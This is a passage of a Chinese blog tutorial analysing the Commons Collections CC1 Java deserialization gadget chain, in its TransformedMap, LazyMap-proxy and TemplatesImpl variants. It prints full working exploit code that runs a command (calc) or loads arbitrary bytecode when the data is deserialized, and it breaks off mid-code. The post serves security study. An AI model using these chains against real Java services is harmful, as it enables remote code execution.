src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106104748114.png" class="" title="This is an example image"><p>这里存在两处判断需要绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (memberType != null) &#123;</span><br><span class="line">if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123;</span><br></pre></td></tr></table></figure><p>首先看第一个判断语句，是对memberType进行判断的。跟踪memberType，是从memberTypes来的，memberTypes又是从annotationType.memberTypes();来的，而annotationType又是从annotationType &#x3D; AnnotationType.getInstance(type);来的。</p><p>那么其实就是从type来的。</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106124951805.png" class="" title="This is an example image"><p>type其实是从构造器传参来的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再回头看我们对构造器的传参，发现type对应Override.class，这里memeberType是获取注解中成员变量的名称，然后并且检查键值对中键名是否有对应的名称，而我们所使用的注解是没有成员变量的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object o=constructor.newInstance(Override.class,transformedmap);</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106125501951.png" class="" title="This is an example image"><p>而我们发现另一个注解:Target中有个名为value的成员变量，所以我们就可以使用这个注解,并改第一个键值对的值为value即可通过两个判断。</p><p>但是依然不能弹计算器。</p><h3 id="三、checkSetValue传入值不是Runtime-class"><a href="#三、checkSetValue传入值不是Runtime-class" class="headerlink" title="三、checkSetValue传入值不是Runtime.class"></a><strong>三、checkSetValue传入值不是Runtime.class</strong></h3><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106130111612.png" class="" title="This is an example image"><p>我们可以发现readObject方法中setValue传入的参数并不是Runtime.class，而是一个奇奇怪怪的东西。</p><ul><li>我们这里找到了一个能够解决 <code>setValue</code> 可控参数的类 ———— <code>ConstantTransformer</code>。</li></ul><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106154143060.png" class="" title="This is an example image"><p>我们看到这个类里面也有transform，和构造器配合使用的话，我们传入什么值，就会返回某个值，这样就能将value的值转为<strong>Runtime.class</strong></p><p>因此接下来给出我们的最终EXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class rr=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//创建一个Transformer数值用于储存InvokerTransformer的数据，便于遍历</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//这里解决问题三</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedtransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//上述利用反射获取类原型+transformer数组＋chainedtransformer遍历实现transform方法，来解决问题一中的无法序列化问题。</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);<span class="comment">//这里是问题二中改键值对的值为注解中成员变量的名称，通过if判断</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,chainedtransformer);</span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object o=constructor.newInstance(Target.class,transformedmap);<span class="comment">//这里是问题二中第一个参数改注解为Target</span></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106164613205.png" class="" title="This is an example image"><p>成功弹出计算器。</p><p>接下来叙述一下整条cc1链的流程</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106170506128.png" class="" title="This is an example image"><h1 id="正版CC1链分析-lazyMap"><a href="#正版CC1链分析-lazyMap" class="headerlink" title="正版CC1链分析-lazyMap"></a>正版CC1链分析-lazyMap</h1><h2 id="终点-利用点-exec方法"><a href="#终点-利用点-exec方法" class="headerlink" title="终点-利用点-exec方法"></a>终点-利用点-exec方法</h2><p>漏洞点与上面一样，还是InvokerTransformer</p><p>在InvokerTransformer#transform下寻找用法</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110195928983.png" class="" title="This is an example image"><p>LazyMap的get方法调用了transform方法且get方法的作用域为public</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110200016287.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">factory.transform</span><br></pre></td></tr></table></figure><p>那么我们看看factory是什么</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110200355043.png" class="" title="This is an example image"><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110200409626.png" class="" title="This is an example image"><p>可以知道factory是LazyMap构造器的参数，同时我们可以通过decorate来new一个LazyMap对象，factory是可以由我们自己决定的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1_lazymap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime runtime=Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map decoratemap=LazyMap.decorate(hashmap,invokerTransformer);</span><br><span class="line">        Class&lt;LazyMap&gt; lazymapclass=LazyMap.class;</span><br><span class="line">        Method lazygetmethod=lazymapclass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>,Object.class);</span><br><span class="line">        lazygetmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        lazygetmethod.invoke(decoratemap,runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110205053416.png" class="" title="This is an example image"><ul><li>目前证明这条链是可行的，我们继续往上走，最终目标是找到入口类的 <code>readObject</code> 方法。</li></ul><p>然后我们的目标就是找谁调用了get方法</p><p>最终在 <code>AnnotationInvocationHandler.invoke()</code> 方法中找到了有一个地方调用了 <code>get()</code> 方法。</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110205729222.png" class="" title="This is an example image"><p>这里其实可以类比成让memberValues为LazyMap即可。</p><p>同时这个类也非常好，它里面有 <code>readObject()</code> 方法，可以作为我们的入口类。</p><p>那么接下来我们要关注的就是如何触发invoke()方法</p><p>需要触发 <code>invoke</code> 方法，马上想到动态代理，一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 <code>invoke()</code> 方法。我们去找一找能利用的地方</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110210202367.png" class="" title="This is an example image"><p>在这里调用了 <code>entrySet()</code> 方法，也就是说，如果我们将 <code>memberValues</code> 的值改为代理对象，当调用代理对象的方法，那么就会跳到执行 <code>invoke()</code> 方法，最终完成整条链子的调用。membervalues是构造器需要传入的参数。</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110210307500.png" class="" title="This is an example image"><p>那么这里就是要先让membervalues为lazymap再设置动态代理。</p><p>exp如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">lazymap_zong</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt;hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map decorateMap= LazyMap.decorate(hashmap,chainedTransformer);</span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler annotationinvocationhandler=(InvocationHandler) constructor.newInstance(Override.class,decorateMap);</span><br><span class="line">        Map proxymap=(Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,annotationinvocationhandler);</span><br><span class="line">        annotationinvocationhandler=(InvocationHandler)constructor.newInstance(Override.class,proxymap);</span><br><span class="line">        serialize(annotationinvocationhandler);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span><span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;ser.bin&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String name)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(name)));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110214009583.png" class="" title="This is an example image"><h2 id="链子整理"><a href="#链子整理" class="headerlink" title="链子整理"></a>链子整理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">调用链</span><br><span class="line">Invokertransformer#transform</span><br><span class="line">LazyMap#get</span><br><span class="line">Annotationinvocationhandler#readObject</span><br><span class="line"></span><br><span class="line">辅助链</span><br><span class="line">ChainedTransformer</span><br><span class="line">ConstantTransformer</span><br><span class="line">HashMap</span><br><span class="line">Map(Proxy)#entrySet</span><br></pre></td></tr></table></figure><p>这里直接借用别人的流程图吧</p><p><img src="https://drun1baby.top/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/CC1LazyMap.png" alt="img"></p><h1 id="CC1-链的-TemplatesImpl-的实现方式"><a href="#CC1-链的-TemplatesImpl-的实现方式" class="headerlink" title="CC1 链的 TemplatesImpl 的实现方式"></a>CC1 链的 TemplatesImpl 的实现方式</h1><p>cc3中得到的思路</p><blockquote><p>TemplatesImpl 只是将原本的命令执行变成代码执行的方式所以在不考虑黑名单的情况下，如果可以进行命令执行，则一定可以通过动态加载字节码进行代码执行。</p></blockquote><ul><li>如图，链子不变，只是最后的命令执行方式变了。</li></ul><p><img src="https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/Diff.png" alt="img"></p><p>所以这里我们先尝试修改命令执行的方法，这时候的链子应该是从后往前的，也就是确定了命令执行的方式之后，将传参设置为动态加载的字节码。并且前面的链子不变。</p><p>暂时的 EXP 是这样的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">templatesImpldynamicclass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class templateClass=templates.getClass();</span><br><span class="line">        Field nameField=templateClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Meteor&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesfield=templateClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\code\\calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;evil&#125;;</span><br><span class="line">        bytecodesfield.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryfield=templateClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后一句，传入 <code>chainedTransformer.transform(1)</code> 是因为前面我们定义了 <code>new ConstantTransformer(templates)</code>，这个类是需要我们传参的，传入 1 即可。</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241130145213179.png" class="" title="This is an example image"><ul><li>OK，弹计算器成功，接下来是把 CC1 链的前半部分拿进去。</li></ul><p>完整的 EXP 如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">templatesImpldynamicclass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> 